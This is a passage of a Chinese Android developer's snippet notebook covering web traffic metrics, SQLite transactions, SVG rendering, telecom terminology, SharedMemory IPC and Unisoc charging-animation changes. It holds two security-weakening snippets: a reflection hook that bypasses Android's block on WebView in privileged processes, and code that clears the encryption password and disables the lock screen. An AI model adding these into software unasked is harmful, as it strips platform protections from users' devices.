用户每次打开一个页面便记录1次PV，多次打开同一页面则浏览量累计。一般来说，PV与来访者的数量成正比，但是PV并不直接决定页面的真实来访者数量，如同一个来访者通过不断的刷新页面，也可以制造出非常高的PV。
具体的说，PV值就是所有访问者在24小时（0点到24点）内看了某个网站多少个页面或某个网页多少次。PV是指页面刷新的次数，每一次页面刷新，就算做一次PV流量。
度量方法就是从浏览器发出一个对网络服务器的请求（Request），网络服务器接到这个请求后，会将该请求对应的一个网页（Page）发送给浏览器，从而产生了一个PV。那么在这里只要是这个请求发送给了浏览器，无论这个页面是否完全打开（下载完成），那么都是应当计为1个PV。

什么是UV？
UV即Unique Visitor，独立访客数，指一天内访问某站点的人数，以cookie或者Token为依据。 
1天内同一访客的多次访问只记录为一个访客。通过IP和cookie是判断UV值的两种方式。
用Cookie分析UV值 
当客户端第一次访问某个网站服务器的时候，网站服务器会给这个客户端的电脑发出一个Cookie，通常放在这个客户端电脑的C盘当中。在这个Cookie中会分配一个独一无二的编号，这其中会记录一些访问服务器的信息，如访问时间，访问了哪些页面等等。当你下次再访问这个服务器的时候，服务器就可以直接从你的电脑中找到上一次放进去的Cookie文件，并且对其进行一些更新，但那个独一无二的编号是不会变的。

什么是VV？
VV即Visit View，访客访问的次数，用以记录所有访客一天内访问网站的次数。
当访客完成所有的浏览并最终关掉该网站的所有页面时，便完成了一次访问，同一访客一天内可能有多次访问行为，访问次数累计。

什么是IP？
IP即独立IP数，指一天内使用不同IP地址的用户访问网站的次数，同一IP无论访问了几个页面，独立的IP数均为1。 
这里需要注意的是：如果两台机器访问服务器而使用的是同一个IP，那么只能算是一个IP的访问。
IP和UV之间的数据不会有太大的差异，通常UV量和比IP量高出一点，每个UV相对于每个IP更准确地对应一个实际的浏览者。

①UV大于IP
这种情况就是在网吧、学校、公司等，公用相同IP的场所中不同的用户，或者多种不同浏览器访问网站，那么UV数会大于IP数。
②UV小于IP
一般的家庭网络中，大多数电脑使用ADSL拨号上网，所以同一个用户在家里不同时间访问网站时，IP可能会不同，因为它会根据时间变动IP，即动态的IP地址，但是实际访客数唯一，便会出现UV数小于IP数的情况。
实例说明
例如，在家用ADSL拨号上网，早上8点访问了www.binghe.com下的2个页面，下午2点又访问了www.binghe.com下的3个页面。那么，对于www.binghe.com来说，今天的PV、UV、VV、IP各项指标该如何计算？
计算PV 
PV指浏览量，PV数等于上午浏览的2个页面和下午浏览的3个页面之和，即 PV = 2 + 3。
计算UV
UV指独立访客数，一天内同一访客的多次访问只计为1个UV，即 UV = 1。
计算VV 
VV指访客的访问次数，上午和下午分别有一次访问行为，即 VV = 2。
计算IP  
IP为独立IP数，由于ADSL拨号上网每次都IP不同，即 IP = 2。
```

## Android上SQLite的性能优化问题

```text
1.利用android提高的的insert，query，update，deleteAPI与execSql，rawQuery函数执行原生的插入，查询，更新，删除语句操作花费时间的对比结果
在相同的环境（adnroid4.0）和相同的机器下执行相同的动作，记录条数也一样的情况下的对比，多次验证的如下：
（1）如果批量执行的记录数在1000条，则Android SqliteDatabase提供的insert，query，update，delete函数和直接写SQL文的execSql，rawQuery的效率差不多，几乎一样。所以使用哪种方式都可以，不会影响到执行效率。
（2）如果批量执行的记录数在10万条，则会存在差别。在某台手机上SqliteDatabase提供的insert执行插入操作耗时45秒，要比execSql插入35秒慢10秒左右。
可见在数据库大的情况下，还是有差别的。execSql省去了拼接sql语句的步骤，要比SqliteDatabase提供的insert，query，update，delete等函数效率高。当数据库越大，差别也越大。

2.Sqlite数据库批量操作效率的问题
应用程序初始化时需要批量的向sqlite中插入大量数据，单独的使用for+Insert方法导致应用响应缓慢, 因为  SQLite的数据库本质上来讲就是一个磁盘上的文件，所以一切的数据库操作其实都会转化为对文件的操作，而频繁的文件操作将会是一个很耗时的过程，会极大地影响数据库存取的速度。sqlite插入数据的时候默认一条语句就是一个事务，有多少条数据就有多少次磁盘操作。初始5000条记录也就是要5000次读写磁盘操作, 将会重复的打开关闭数据库文件5000次，所以速度当然会很慢。而且不能保证所有数据都能同时插入。

解决方法：
添加事务处理，把5000条插入作为一个事务
我们使用SQLite的事务进行控制：
db.beginTransaction();  //手动设置开始事务
try{
    //批量处理操作
    for(Collection c:colls){
        insert(db, c);
    }
    db.setTransactionSuccessful(); //设置事务处理成功，不设置会自动回滚不提交。
    //在setTransactionSuccessful和endTransaction之间不进行任何数据库操作 
}catch(Exception e){
    MyLog.printStackTraceString(e);
}finally{
    db.endTransaction(); //处理完成
}
这样SQLite将把全部要执行的SQL语句先缓存在内存当中，然后等到COMMIT的时候一次性的写入数据库，这样数据库文件只被打开关闭了一次，效率自然大大的提高
```

## 设置锁屏方式为none

```text
import com.android.internal.widget.LockPatternUtils;
public void setLockNone() {
    mLockPatternUtils = new LockPatternUtils(getApplicationContext());
    mLockPatternUtils.clearEncryptionPassword();
    mLockPatternUtils.clearLock(0);
    mLockPatternUtils.setLockScreenDisabled(true,0);
}
```

## [知识点] 运算符重载

```text
运算符重载：在计算机程序设计中，运算符重载（英语：operator overloading）是多态的一种。运算符重载，就是对已有的运算符重新进行定义，赋予其另一种功能，以适应不同的数据类型。
```

## [知识点] 语法糖

```text
语法糖：语法糖（Syntactic sugar），也译为糖衣语法，是由英国计算机科学家彼得·兰丁发明的一个术语，指计算机语言中添加的某种语法，这种语法对语言的功能没有影响，但是更方便程序员使用。语法糖让程序更加简洁，有更高的可读性。
```

## [知识点] string的加法运算

```text
(new StringBuilder()).append(str).append(s).toString();
```

## LayoutInflator 的正确打开方式

```text
1.若我们采用convertView = inflater.inflate(R.layout.item_list, null);方式填充视图，item布局中的根视图的layout_XX属性会被忽略掉，然后设置成默认的包裹内容方式

2.如果我们想保证item的视图中的参数不被改变，我们需要使用convertView = inflater.inflate(R.layout.item_list, parent,false);这种方式进行视图的填充

3.除了使用这种方式，我们还可以设置item布局的根视图为包裹内容，然后设置内部控件的高度等属性，这样就不会修改显示方式了。
```

## 学习参考 commons-lang.jar， commons-collections.jar， commons-beanutils.jar 包中一些工具类的实现方法

```text
commons-lang.jar， commons-collections.jar， commons-beanutils.jar等，里面很多方法可能是你曾经用几十几百行代码实现过的，但是执行效率或许要差很多，比如：ArrayUtils，StringUtils……；
```

## whatfuck

```text
58、java8中新增的LocalDate和LocalTime接口，Date虽然是个万能接口，但是它真的不好用，有了这俩，终于可以愉快的处理日期时间了。

59、WeakHashMap，直接使用HashMap有时候会带来内存溢出的风险，使用WaekHashMap实例化Map。当使用者不再有对象引用的时候，WeakHashMap将自动被移除对应Key值的对象。

Messenger

includeFontPadding="false"，TextView默认上下是有一定的padding的，有时候我们可能不需要上下这部分留白，加上它即可。

AsyncQueryHandler，如果做系统工具类的开发，比如联系人短信辅助工具等，肯定免不了和ContentProvider打交道，如果数据量不是很大的情况下，随便搞，如果数据量大的情况下，了解下这个类是很有必要的，需要注意的是，这玩意儿吃异常..

HandlerThread，代替不停new Thread开子线程的重复体力写法。
```

## 绘制SVG

```text
private Thread thread = new Thread() {
    @Override
    public void run() {
        //Alt+Shift+箭头移动
        try {
            //对China.svg进行解析
            InputStream inputStream = getContext().getResources().openRawResource(R.raw.china);
            //通过DocumentBuilderFactory创建一个DocumentBuilder对象
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            DocumentBuilder builder = factory.newDocumentBuilder();
            //通过builder对象将svg资源转化为Document对象
            Document document = builder.parse(inputStream);
            //获取根节点
            Element rootElement = document.getDocumentElement();
            //获取根节点下面的path节点
            //定义整个地图的四个点
            float left=-1,top=-1,right=-1,bottom=-1;
            NodeList nodeList = rootElement.getElementsByTagName("path");
            //遍历所有path节点
            for (int i = 0; i < nodeList.getLength(); i++) {
                Element element = (Element) nodeList.item(i);
                String pathData = element.getAttribute("d");
                //解析pathData属性数据
                Path path = PathParser.createPathFromPathData(pathData);
                ProvinceBean bean = new ProvinceBean(path);
                //bean.setFillColor(Color.parseColor(fillColor));
                pathList.add(bean);
                //计算整个地图的区域
                RectF rectF = new RectF();
                path.computeBounds(rectF,true);
                left=left==-1?rectF.left:Math.min(left,rectF.left);
                top=top==-1?rectF.top:Math.min(top,rectF.top);
                right=right==-1?rectF.right:Math.max(right,rectF.right);
                bottom=bottom==-1?rectF.bottom:Math.max(bottom,rectF.bottom);
            }
            pathRectF=new RectF(left,top,right,bottom);
            measure(getMeasuredWidth(),getMeasuredHeight());
            handler.sendEmptyMessage(1);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
};
```

## 从矢量图SVG获取位图bitmap

```text
public static Bitmap getBitmapFromDrawable(Context context, @DrawableRes int drawableId) {
    Drawable drawable = ContextCompat.getDrawable(context, drawableId);

    if (drawable instanceof BitmapDrawable) {
        return ((BitmapDrawable) drawable).getBitmap();
    } else if (drawable instanceof VectorDrawable || drawable instanceof VectorDrawableCompat) {
        Bitmap bitmap = Bitmap.createBitmap(drawable.getIntrinsicWidth(), drawable.getIntrinsicHeight(), Bitmap.Config.ARGB_8888);
        Canvas canvas = new Canvas(bitmap);
        drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
        drawable.draw(canvas);

        return bitmap;
    } else {
        throw new IllegalArgumentException("unsupported drawable type");
    }
}
```

## Linux 组成部分

```text
事实上，Linux 操作系统可以由下面这几部分构成

引导程序(Bootloader)：引导程序是管理计算机启动过程的软件，对于大多数用户而言，只是弹出一个屏幕，但其实内部操作系统做了很多事情
内核(Kernel)：内核是操作系统的核心，负责管理 CPU、内存和外围设备等。
初始化系统(Init System)：这是一个引导用户空间并负责控制守护程序的子系统。一旦从引导加载程序移交了初始引导，它就是用于管理引导过程的初始化系统。
后台进程(Daemon)：后台进程顾名思义就是在后台运行的程序，比如打印、声音、调度等，它们可以在引导过程中启动，也可以在登录桌面后启动
图形服务器(Graphical server)：这是在监视器上显示图形的子系统。通常将其称为 X 服务器或 X。
桌面环境(Desktop environment)：这是用户与之实际交互的部分，有很多桌面环境可供选择，每个桌面环境都包含内置应用程序，比如文件管理器、Web 浏览器、游戏等
应用程序(Applications)：桌面环境不提供完整的应用程序，就像 Windows 和 macOS 一样，Linux 提供了成千上万个可以轻松找到并安装的高质量软件。
```

## 解决 WebView 报错 Binary XML file line #7 Error inflating class android.webkit.WebView

```text
问题描述
在系统进程中使用 WebView 时，会抛出
AndroidRuntime: Caused by: java.lang.UnsupportedOperationException: For security reasons, WebView is not allowed in privileged processes

特权进程包括sharedUserId为ROOT_UID和SYSTEM_UID的进程

解决办法
通过 hook 加载过程避免

在项目的 Application OnCreate() 或者要加载的 Activity setContentView() 前调用 hookWebView()

再次运行问题解决

public static void hookWebView(){
    int sdkInt = Build.VERSION.SDK_INT;
    try {
        Class<?> factoryClass = Class.forName("android.webkit.WebViewFactory");
        Field field = factoryClass.getDeclaredField("sProviderInstance");
        field.setAccessible(true);
        Object sProviderInstance = field.get(null);
        if (sProviderInstance != null) {
            Log.i("hook","sProviderInstance isn't null");
            return;
        }

        Method getProviderClassMethod;
        if (sdkInt > 22) {
            getProviderClassMethod = factoryClass.getDeclaredMethod("getProviderClass");
        } else if (sdkInt == 22) {
            getProviderClassMethod = factoryClass.getDeclaredMethod("getFactoryClass");
        } else {
            Log.i("hook","Don't need to Hook WebView");
            return;
        }
        getProviderClassMethod.setAccessible(true);
        Class<?> factoryProviderClass = (Class<?>) getProviderClassMethod.invoke(factoryClass);
        Class<?> delegateClass = Class.forName("android.webkit.WebViewDelegate");
        Constructor<?> delegateConstructor = delegateClass.getDeclaredConstructor();
        delegateConstructor.setAccessible(true);
        if(sdkInt < 26){//低于Android O版本
            Constructor<?> providerConstructor = factoryProviderClass.getConstructor(delegateClass);
            if (providerConstructor != null) {
                providerConstructor.setAccessible(true);
                sProviderInstance = providerConstructor.newInstance(delegateConstructor.newInstance());
            }
        } else {
            Field chromiumMethodName = factoryClass.getDeclaredField("CHROMIUM_WEBVIEW_FACTORY_METHOD");
            chromiumMethodName.setAccessible(true);
            String chromiumMethodNameStr = (String)chromiumMethodName.get(null);
            if (chromiumMethodNameStr == null) {
                chromiumMethodNameStr = "create";
            }
            Method staticFactory = factoryProviderClass.getMethod(chromiumMethodNameStr, delegateClass);
            if (staticFactory!=null){
                sProviderInstance = staticFactory.invoke(null, delegateConstructor.newInstance());
            }
        }

        if (sProviderInstance != null){
            field.set("sProviderInstance", sProviderInstance);
            Log.i("hook","Hook success!");
        } else {
            Log.i("hook","Hook failed!");
        }
    } catch (Throwable e) {
        Log.w("hook",e);
        e.printStackTrace();
    }
}
```

## [SPRD] 语言列表

```text
build/target/product/languages_default.mk
```

## [知识点] CSFB

```text
我们知道，2g网络存在ps域 与cs域分别为 GPRS GSM网络，3g没有区分ps cs，4g的域变成了IMS 和 EPC

lte网络语音解决方案有如下几种

方案     特点
双通双待 两套收发器，分别驻留lte网络和2g/3g网络
CSFB 回落到2g或者3g网络
volte ims域，4g高清语音
ott 类似微信的语音通信方式

关于cs ps ims域介绍
cs 电路交换域，用于语音通信
ps 分组交换域 用于数据通信
ims 多媒体子系统，支持语音业务

本文主要介绍下CSFB相关内容,至于volte后面再说
现在终端如果使用4g网络，并且不支持volte，如何进行语音业务呢，那就采用回落到2g/3g网络的cs域进行语音业务。
但是终端要支持CSFB必须有一下条件：
1.终端所在区域重叠覆盖4g网络和2g/3g网络
2.终端要同时支持4g网络和2g/3g网络

注：lte的MME通过SGs接口与2G/3G的MSC-S通信
```

## [知识点] AP，BP，CP

```text
AP（application process）：手机中的应用处理器CPU。操作系统、用户界面和应用程序都在AP上执行。

BP（baseband）：基带处理器。即手机中的modem，运行手机射频通讯控制软件，负责发送和接收数据。

CP：基带芯片加协处理器 or 多媒体加速器。可以处理虚拟现实，增强现实，图像处理，HIFI，HDR，传感器等。

一、我们先来看看手机CPU中的分类：

AP应用处理器：

手机CPU中最主要的一部分，手机的系统运作还有APP的运行，靠的都是AP应用处理器。例如：苹果A9处理器指的就是AP。

手机CPU知识扫盲：谈谈手机CPU架构与原理

BP基带处理器：

其实很多玩家都只听过基带这个东西，但不知道这个到底是什么。基带处理器管理的是手机一切无线信号（除了wifi，蓝牙，NFC等等），一款手机支持多少种网络模式，支持4G还是3G，都是由基带部分决定的。BP做的最有名的是高通，其实高通发家靠的就是优秀的BP基带处理器，而不是AP应用处理器。

手机CPU知识扫盲：谈谈手机CPU架构与原理

可能大家对高通的BP没有什么印象，这里我就跟大家举几个使用高通BP的手机。iPhone4到iPhone6sp全系列手机都是使用高通的BP（这些手机都是我亲手拆解过的，iPhone3Gs等等我不能肯定是不是高通的BP），还有全部3G版的iPad，加上三星这几年的旗舰也是都是使用的BP，还有大量使用高通CPU的手机产品也都是使用高通的BP。那么高通在BP领域的是什么地位就不用我说了。

CP多媒体加速器：

其实每个厂商对CP都有不同的名字，比如苹果把它叫做协处理器，高通820叫做“低功率岛”。在早期CP只用于解码视频和处理音频等等简单任务。

手机CPU知识扫盲：谈谈手机CPU架构与原理

但是各大厂商发现，CP的性能其实也可以很高，于是开始处理的东西越来越多。现在的CP已经可以处理虚拟现实，增强现实，图像处理，HIFI，HDR，传感器等等。

手机CPU知识扫盲：谈谈手机CPU架构与原理

二、手机CPU核心数真的越多越好吗？

从2011年英伟达发布一款双核手机CPU开始，手机CPU的核战就爆发了，到之后的4核，8核，10核。甚至intel向外界展示过80核的处理器原型，但至今没有能利用这一处理器的系统。

在这里我可以很明确的告诉大家核心数越多肯定不代表更加好。现在ARM架构性能最好的处理器是苹果的A9X（iPad Pro使用的处理器），但是A9X只是双核CPU而已。

那么为什么一些双核CPU的性能都要比那些所谓8核的CPU要好了。因为CPU运算逻辑部件的面积大小决定了CPU晶体管的数量（下图白灰色部分）。下图就是三星猎户座7420和苹果A9的大小对比图，我们不难发现苹果A9双核CPU运算逻辑部件的面积比三星8核还大，这就代表这A9的晶体管数量比三星7420要多。正是这样才使得A9比7420的性能好很多。

手机CPU知识扫盲：谈谈手机CPU架构与原理

那么这样说多核心就没有好处了吗？

当然不是，多核心比在多任务处理和功耗方面确实会表现的更加优秀。但是很多时候我们真的需要8核吗？苹果告诉我们，不管安卓怎么样，反正ios双核心就足够了，这和ios的运用后台处理机制是有很大关系的（ios在运行大量APP之后就会把之前的APP关闭）。

但是不爱关闭后台的安卓需要多少核心才行了？我想骁龙820已经告诉了我们，4核就已经够了。

三、ARM架构和X86架构的区别：

ARM架构：

ARM架构使用的是精简指令集，我们可以把它看成一辆汽车，在之前一直都是低功耗的代名词。

手机CPU知识扫盲：谈谈手机CPU架构与原理

X86架构：

X86架构使用的是复杂指令集，我们可以把它看成一架飞机，在之前一直都是高性能的代名词。

手机CPU知识扫盲：谈谈手机CPU架构与原理

最开始也是因为低功耗，所以移动端的设备，都是使用的ARM。但是随着移动端的高速发展，ARM架构的处理器的性能也开始变得原来越强大。

那么ARM架构的CPU对比PC端的CPU实际运行起来到底有什么区别了？

比如一条指令来了，要把一个货物从北京运送到上海，这个时候我们会发现飞机必须快过汽车，但是如果另一个指令是要把一个货物从街头运到街尾了？这个时候，飞机发现，它要想做到基本是不太可能，这个时候只有在增加一条新的指令集（相当于要重新制作一架大小适合的飞机了）。

但是随着移动端设备的高速发展，ARM架构的性能已经变得越来越强了，ARM架构的性能超过X86架构已经只是时间问题了。

CPU的里面的学问很多，今天我就只写出以上三点，都是比较有用的干货，希望对小白的朋友有所帮助。其实决定手机CPU性能的决定性因素主要由：核心、主频、工艺、GPU等多方面决定，并不是单个方面强，性能就一定强。
```

## [知识点] MMI、SS、USSD介绍

```text
MMI是Man-Machine-Interface的缩写:

从功能上来看，有一些从拨号盘拨出去的字符串，它的实际作用不是建立一个通话而是为了完成某种服务，这个就是MMI；从格式上来看，每一个从拨号盘输入的字符串，如果包含有*或者#，都可以称之为MMI.

MMI包括SS, USSD,Manufacturer defined MMI codes, SIM control codes等等。

1.Manufacturer defined MMI codes

一些嵌在手机里的服务码，比如你要查询一个手机的IMEI号码，你可以在拨号键盘输入*#06#，手机的IMEI码会自动弹出来。

2.SIM control codes

比如用来修改SIM卡PIN码的命令，在拨号键盘输入**04*1234*6789*6789#，这将会将SIM卡的PIN码从1234修改成为6789.

3.SS

Supplementary Service，补充服务，比如控制号码显示，呼叫转移等服务的号码串。这些号码串是每部GSM/UMTS/LTE手机中的固定服务号码，运营商是不能对它进行修改的。当手机系统接受到这些服务号码后，先在手机内部进行处理后，再传给网络。比如你随便拿个手机，在拨号盘输入*21*123456789#然后点击发送，这个时候你所有的来电都会直接转移到123456789。

4.USSD

与SS相对应的是Unstructured Supplementary Service Data。从字面上看，是非结构化的补充字符，曾经我以为字符串格式上的不同是SS和USSD间最大的区别，后来发现自己大错特错了：单从字符串格式上是没法区分的。那他俩到底有啥区别？一，USSD基本都是运营商根据自己的服务自己定制的，而SS就像上面说的是每个手机固有的；二，SS在发送给网络前，手机首先会自己处理一下，而USSD是完全透明的传送给网络。

SS和USSD都必须点击发送后才能生效，而Manufacturer defined MMI codes和SIM control codes都不需要点击，输入后直接生效。

 

MMI格式

手机支持如下格式的MMI。

Activation : *SC*SI#

Deactivation : #SC*SI#

Interrogation : *#SC*SI#

Registration :  *SC*SI# and **SC*SI#

Erasure : ##SC*SI#

 

Action：*，#，*#，**，##。

SC: Service Code, 由2-3位数字组成

SI:  Supplementary Information。

MMI串通常以*，#，*#，**，##等开头，以#结束。各个部分间以*隔开。
```

## [知识点] 高通平台常用缩写

```text
LPASS:Low power audio subsystem
AMSS:Advanced Mode Subscriber Software 先进移动用户软件
KBA: Knowledge Base Article
QRD:Qualcomm Reference Design 高通参考设计
MSM = Mobile Stattion Modem  集成芯片，包括通信处理器和应用处理器
MDM = Mobile Data Modem  通信处理器，高通提供给iPhone的就是这种
DL (紧急下载模式）
adb reboot edl （使手机进入pbl紧急下载模式）
adb reboot dload （进入sbl1普通下载模式）
EDL : Emergency Download
PBL：APPS PBL(Application Primary Boot Loader)，主引导加载程序

DSDA  Dual SIM Dual Active 双卡双通
DSDS  Dual SIM Dual Standby 双卡双待

MBN: Modem Configuration binary
QCN:
SOP：Standard Operation Procedure 标准操作指导书

RPC:是远程过程调用（Remote Procedure Call）。

EVT:是Engineering Verification Test 的简称，意为 工程验证测试
DVT:是 Design Verification Test的简称， 意为设计验证测试
PVT:是 Pilot-run Verification Test的简称，意为小批量过程验证测试
```

## [知识点] 5G入门科普

```text
https://blog.csdn.net/ZhongGuoRenMei/article/details/103628032
```

## android 静默重启 QUIESCENT REBOOT

```text
项目中需要处理Android的原生开机动画，一定条件下还需要做到静默重启（android系统启动进入到桌面前，屏幕保持完全没有亮度的状态）。因为项目使用的rom是MTK平台支持，一开始并不知道Android 的QUIESCENT_REBOOT模式，所以自己想办法实现了此功能，详细见博客：基于Q的Android开机动画。因为后续Linux启用了SELinux增强了权限限制，原有的方案因为权限限制了文件的执行和读写，需要进行比较大的变动。后来，学习了下Android 的QUIESCENT_REBOOT模式，并把它用到了项目中解决了问题。这里介绍下QUIESCENT_REBOOT模式原理。

Android Quiescent的原理和流程
一、powerManager.reboot(PowerManager.REBOOT_QUIESCENT) 来静默重启（本地测试可以通过命令行触发svc power reboot quiescent）
```

## [知识点] 载波聚合

```text
https://blog.csdn.net/ZhongGuoRenMei/article/details/103323195
载波聚合（CA，Carrier Aggrigation）是LTE-A的1个关键特性，3GPP在Release 10（TR 36.913）引入了载波聚合，通过将多个连续或非连续的载波聚合成更大的带宽（最大100MHz）来满足3GPP的要求。
```

## SharedMemory使用，跨进程传输byte数据

```text
参见官方文档
https://developer.android.google.cn/reference/android/os/SharedMemory?hl=en
一、服务端创建并存入数据：
// 1、使用文件流把文件读入到内存
FileInputStream inputStream = new FileInputStream(jpegFile);
byte[]  bytes = new byte[(int) jpegFile.length()] ;
inputStream.read(bytes);

// 2、创建sharedMemory跨进程传输
SharedMemory sharedMemory = SharedMemory.create("test", bytes.length);
// 3、mapReadWrite获取ByteBuffer
ByteBuffer buffer = sharedMemory.mapReadWrite();
// 4、put数据
buffer.put(bytes);
// 5、把sharedMemory权限设置为只读，create默认是读写权限都有，这里可以避免客户端更改数据
sharedMemory.setProtect(OsConstants.PROT_READ);
// 6、使用完需要unmap
SharedMemory.unmap(buffer);
return sharedMemory;

二、客户端获取数据显示
// 1、通过aidl拿到SharedMemory
SharedMemory sharedMemory = iService.takeScreenshot();
if (sharedMemory == null) {
    return;
}
// 2、mapReadOnly获取到存了数据的ByteBuffer
ByteBuffer byteBuffer = sharedMemory.mapReadOnly();
int len = byteBuffer.limit() - byteBuffer.position();
byte[]  bytes = new byte[len] ;
// 3、借助byteBuffer获取到数据
byteBuffer.get(bytes);
// 4、把字节转换成bitmap并显示到imageView
Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
imageView.setVisibility(View.VISIBLE);
imageView.setImageBitmap(bitmap);
// 5、使用完unmap同时close sharedMemory释放内存
SharedMemory.unmap(byteBuffer);
sharedMemory.close();
注意事项
1、服务端service销毁时，记得sharedMemory.close
2、服务端传输sharedMemory时，记得setProtect(OsConstants.PROT_READ)
3、客户端使用完sharedMemory，最好unmap下，避免内存占用
```

## [SPRD] 展锐Android R关机充电动画修改

```text
关机充电是用minui开发的，代码路径如下
vendor/sprd/proprietories-source/charge

代码中的图片资源路径
vendor/sprd/proprietories-source/charge/images

手机上的图片资源路径
vendor/etc/res/images

项目的屏幕分辨率是540X1200，根据 vendor/sprd/proprietories-source/charge/ui.c 代码中的判断，是 SIZE_720X1280
static int res_pixel_identify(void) {
 int x = gr_fb_width();
 int y = gr_fb_height();
 int size = 0;
 if((x<= 360) && (y <= 640)){
  size = SIZE_360X640;
 }else if((x<=480) && (y<=800)){
  size = SIZE_480X800;
 }else if((x<=480) && (y<=854)) {
  size = SIZE_480X800;
  LOGD("480 * 854 Use res of 480 * 800\n");
 }else if((x<=720) && (y<=1280)){
  size = SIZE_720X1280;
 }else if((x<=1080) && (y<=1920)){
  size = SIZE_1080X1920;
 }else if((x<=1440) && (y<=2560)){
  size = SIZE_1440X2560;
 }else{
  LOGE("Picture size is not standard size\n");
 }
 return size;
}

从如下代码中得知，对应电池电量的图片是根据 PROGRESSBAR_INDETERMINATE_STATES 这个值来进行设置的，默认为0%-100%每16.6%为一档7个状态，但要求是20%为一档，我们只需要修改 0-5 档的6个状态的图片资源，并把 PROGRESSBAR_INDETERMINATE_STATES 改为 6 即可
#define PROGRESSBAR_INDETERMINATE_STATES 7
frame = level * (PROGRESSBAR_INDETERMINATE_STATES - 1) / 100;

然后修改电池电量 level 的字体，默认情况下字体是显示在图片的外面的上面，客户要求显示在图片中间，而且默认是用图片显示的，默认代码如下：
#ifdef PICTURE_SHOW_PERCENT_SUPPORT
 draw_text_picture(level);
#else
 draw_text_xy((dy + height),  (gr_fb_width()/2 - 20),  bat);
#endif

首先去掉文件上面定义的宏 PICTURE_SHOW_PERCENT_SUPPORT，让它走 draw_text_xy 去画字体
然后修改 x,y 的坐标居中显示，修改后的代码如下：
#ifdef PICTURE_SHOW_PERCENT_SUPPORT
    draw_text_picture(level);
#else
    draw_text_xy((dy + height / 2),  (gr_fb_width()/2 - 20),  bat);
#endif

修改之后发现字体不见了，找了一下原因原来是先画字体然后画图片导致字体被覆盖了，只需要修改一下图片和字体的顺序即可，修改之后代码如下：
    if (gProgressBarType == PROGRESSBAR_TYPE_INDETERMINATE) {
        gr_blit(gProgressBarIndeterminate[frame] ,  0,  0,  width,  height,  dx,  dy);   //画电量的图片
        frame = (frame + 1);
        if (frame >= PROGRESSBAR_INDETERMINATE_STATES) {
            frame = level * (PROGRESSBAR_INDETERMINATE_STATES - 1) / 100;
        }
    }
#ifdef PICTURE_SHOW_PERCENT_SUPPORT
    draw_text_picture(level);
#else
    draw_text_xy((dy + height / 2),  (gr_fb_width()/2 - 20),  bat);
#endif

然后修改字体的颜色，修改之后的代码如下
gr_color(0xa4,0xc6,0x39,255);   //RGBA，0xa4c639是客户要求的颜色
draw_text_xy((dy + height / 2),  (gr_fb_width()/2 - 20),  bat);

然后测试之后发现这个字体的坐标是固定坐标，从左边开始画字体，对于0-9是居中的，但是10-100就不是居中的了，需要添加判断level，动态修改字体x的坐标，修改后的代码如下：
gr_color(0xa4,0xc6,0x39,255);
if (level < 10) {
    draw_text_xy((dy + height / 2),  (gr_fb_width()/2 - 20),  bat);
} else if (level < 100) {
    draw_text_xy((dy + height / 2),  (gr_fb_width()/2 - 30),  bat);
} else {
    draw_text_xy((dy + height / 2),  (gr_fb_width()/2 - 40),  bat);
}

然后发现客户对字体也有要求，他们也提供了96x2的图片资源，查看代码发现本身已经支持了这个功能，代码如下：
vendor/sprd/proprietories-source/charge/minui/graphics.c
static void gr_init_font(void) {
    gr_font = calloc(sizeof(*gr_font), 1);

    int res = res_create_alpha_surface("font", &(gr_font->texture));    //系统本身会先去找 font.png 这个资源文件，如果没有就用默认的
    if (res == 0) {
        // The font image should be a 96x2 array of character images.  The
        // columns are the printable ASCII characters 0x20 - 0x7f.  The
        // top row is regular text; the bottom row is bold.
        gr_font->cwidth = gr_font->texture->width / 96;
        gr_font->cheight = gr_font->texture->height / 2;
    } else {
        printf("failed to read font: res=%d\n", res);

        // fall back to the compiled-in font.
        gr_font->texture = malloc(sizeof(*gr_font->texture));
        gr_font->texture->width = font.width;
        gr_font->texture->height = font.height;
        gr_font->texture->row_bytes = font.width;
        gr_font->texture->pixel_bytes = 1;

        unsigned char* bits = malloc(font.width * font.height);
        gr_font->texture->data = (void*) bits;

        unsigned char data;
        unsigned char* in = font.rundata;
        while ((data = *in++)) {
            memset(bits, (data & 0x80) ? 255 : 0, data & 0x7f);
            bits += (data & 0x7f);
        }

        gr_font->cwidth = font.cwidth;
        gr_font->cheight = font.cheight;
    }
}
系统本身会先去找 font.png 这个资源文件，如果没有就用默认的，所以我们只需要把客户提供的图片改为 font.png 让后放入资源文件夹中即可，测试之后有效果

然后客户对充电动画也有要求，默认的充电动画在没充满的情况下是从0-5每一张图片都会播放，客户要求是 0%-19% 在0-1之间变化，修改后的代码如下
    if (gProgressBarType == PROGRESSBAR_TYPE_INDETERMINATE) {
        gr_blit(gProgressBarIndeterminate[frame] ,  0,  0,  width,  height,  dx,  dy);
        if (frame > level * (PROGRESSBAR_INDETERMINATE_STATES - 1) / 100) {
            frame = level * (PROGRESSBAR_INDETERMINATE_STATES - 1) / 100;
        } else {
            frame = (frame + 1);
        }
        if (level >= 100) {
            frame = PROGRESSBAR_INDETERMINATE_STATES - 1;
        }
    }
#ifdef PICTURE_SHOW_PERCENT_SUPPORT
    draw_text_picture(level);
#else
    gr_color(0xa4, 0xc6, 0x39, 255);
    if (level < 10) {
        draw_text_xy((dy + height / 2),  (gr_fb_width()/2 - 20),  bat);
    } else if (level < 100) {
        draw_text_xy((dy + height / 2),  (gr_fb_width()/2 - 30),  bat);
    } else {
        draw_text_xy((dy + height / 2),  (gr_fb_width()/2 - 40),  bat);
    }
#endif
    gr_flip();      //从下面的方法介绍中得知这个方法的作用是“刷新显示内容”，调用这个方法之后就会重新调用 charge_thread() 这个方法

修改每次刷新的时间为750ms
void *charge_thread(void *cookie) {
    int bat_level = 0;
    for (; !is_exit; ) {
     if(thread_ext_ctrl == CHARGE_THREAD_CTRL){
      thread_count++;
      if(thread_count > 5){
       is_exit = 1;
       thread_count = 0;
      }
     }
        usleep(1000000/ PROGRESSBAR_INDETERMINATE_FPS);
        bat_level = battery_capacity();
     if(bat_level < 0){
      thread_st = CHARGE_THREAD_EXIT_ERROR;
     }else{
      thread_st = CHARGE_THREAD_OK;
     }
     pthread_mutex_lock(&gchargeMutex);
     led_control(bat_level);
     status_index = charge_health_check();
     if (screen_on_flag == 1) {
        draw_progress_locked(bat_level);
     }
     pthread_mutex_unlock(&gchargeMutex);
     //modified begin
        usleep(750000); //这里原来是500000微秒，现在改为750000微秒
